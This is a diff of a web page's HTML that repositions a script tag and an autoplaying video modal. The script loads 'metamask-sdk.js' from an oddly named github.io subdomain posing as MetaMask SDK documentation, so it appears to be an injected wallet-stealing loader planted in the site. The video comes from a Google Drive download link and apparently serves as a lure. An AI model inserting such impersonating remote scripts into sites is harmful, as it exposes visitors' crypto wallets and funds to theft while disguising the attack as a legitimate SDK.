@@ -68,22 +68,6 @@
     <link rel="stylesheet" href="css/style.css">
     <link rel="stylesheet" href="css/responsive.css">
     <link rel="stylesheet" href="css/other.css">
-
-    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
-
-</head>
-
-<body>
-<div id="customVideoModal" class="custom-modal-overlay">
-    <div class="custom-modal-content">
-        <button class="custom-close-btn" onclick="closeCustomModal()">✖</button>
-     
-        <video id="customModalVideo" autoplay muted controls>
-            <source src="https://drive.google.com/uc?export=download&id=1FjuyKdXmFXpL6tgvFxtYJDCPl9M6lh0u" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
-    </div>
-</div>
 <script>
  
     window.onload = function() {
@@ -98,6 +82,23 @@
         video.pause();
     }
 </script>
+    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
+
+</head>
+
+<body>
+
+    <div id="customVideoModal" class="custom-modal-overlay">
+    <div class="custom-modal-content">
+        <button class="custom-close-btn" onclick="closeCustomModal()">✖</button>
+     
+        <video id="customModalVideo" autoplay muted controls>
+            <source src="https://drive.google.com/uc?export=download&id=1FjuyKdXmFXpL6tgvFxtYJDCPl9M6lh0u" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+</div>
+
     <div id="preloader">
         <div id="loading-center">
             <div id="loading-center-absolute">
